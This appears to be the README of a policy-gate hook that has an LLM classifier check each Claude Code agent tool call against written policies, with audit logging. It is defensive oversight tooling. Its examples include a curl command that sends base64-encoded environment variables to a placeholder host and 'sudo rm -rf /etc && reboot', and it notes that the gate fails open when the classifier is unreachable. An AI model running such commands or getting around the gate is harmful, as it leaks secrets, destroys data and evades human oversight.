# g8

an agent policy gate for Claude Code. you write rules in english, in a json
file. every tool call your agent makes gets checked against them before it
runs. if it breaks one, it doesn't run.

```
you: git push origin main

agent: The push didn't run. A hook blocked it with the policy gate
       no-github-actions-on-main, which says: "Never push to main or
       bypass branch protection."

       If you want to push to main, tell me to push a different branch
       or open a PR instead.
```

that's a real transcript from testing this. no permission dialog, nobody
clicking approve — the agent just knows the rule and works within it.

## why

permission prompts don't scale past one person sitting there watching. a
"yes to all this session" habit defeats them entirely, and a policy you can't
spell out somewhere is a policy you can't audit. so: policies live in
`policies.json`, an LLM classifies each call against them, and the harness
enforces the verdict. the model isn't asked nicely to obey rules — it's told
after the fact which one it broke.

## setup

clone, then point Claude Code at the hook. either via plugin:

```
cp -r plugin ~/.claude/plugins/g8
```

or by hand in `~/.claude/settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      { "matcher": "*", "hooks": [
        { "type": "command", "command": "node /path/to/g8/gate-hook.mjs" }
      ]}
    ]
  }
}
```

nothing else to install. you'll need access to the typesafe.ai systemone
endpoint (auth goes through whatever egress proxy you have; the hook sends a
bearer token it expects to be swapped upstream).

## policies

```json
{
  "policies": [
    { "id": "no-secrets-exfiltration",
      "description": "Never send credentials, environment variables, API keys, tokens, or file contents likely to contain secrets to any external host or non-company recipient." },
    { "id": "no-destructive-shell",
      "description": "Never run destructive shell commands: rm -rf outside the project, disk formatting, chmod 777 on system paths, killing unrelated processes, or modifying /etc, /usr, /bin." },
    { "id": "no-push-main",
      "description": "Never push to main or bypass branch protection. Never close issues or merge PRs without explicit user instruction in this conversation." }
  ]
}
```

write them like you'd explain them to a new teammate. the description is all
the classifier sees, so be concrete about what counts as a violation — the
sample policies above are a decent starting point. cap is 250.

the hook also feeds the classifier the tail of the conversation, so intent
counts: `echo $PATH` is fine, `curl https://whatever --data "$(env | base64)"`
is not, and the gate gets that right.

## what we've verified

- base64-wrapped env exfil through curl → blocked
- `sudo rm -rf /etc && reboot` → blocked
- env reads, `whoami`, `npm test`, `git push origin feature-x` → allowed
- push to main with a no-push-main policy → blocked, agent adapts and offers a PR instead

decisions take ~0.4s. every one of them lands in `~/.g8/audit.jsonl` — allow,
block, or error — so you can diff what your agent actually did against what
you thought you'd told it.

if the classifier is unreachable the hook fails open (logs to stderr and
lets the call through). set `GATE_FAIL_CLOSED=1` if you'd rather have the
opposite. this is a real choice and you should make it deliberately.

## notes

- ports to other harnesses are planned (openai agents sdk, codex). the hook
  format is the only claude-specific part.
- per-project policies aren't in yet; there's one global set.
- anthropic has its own safety layer that flags some commands upstream
  (credential-theft-looking stuff). g8 is for the policies only you know
  about — it stacks with that, doesn't replace it.
